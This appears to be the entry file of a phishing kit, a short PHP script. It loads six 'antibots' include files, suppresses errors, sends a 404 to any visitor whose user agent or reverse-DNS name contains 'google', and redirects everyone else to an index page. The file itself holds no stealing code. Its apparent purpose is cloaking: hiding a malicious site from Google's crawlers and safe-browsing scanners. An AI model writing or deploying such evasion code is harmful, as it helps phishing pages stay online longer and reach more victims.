<?php
session_start();
error_reporting(0);
/* */
include "../bot/antibots1.php";
include "../bot/antibots2.php";
include "../bot/antibots3.php";
include "../bot/antibots4.php";
include "../bot/antibots5.php";
include "../bot/antibots6.php";

//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//

/* */

header("location: ../index.php");
?>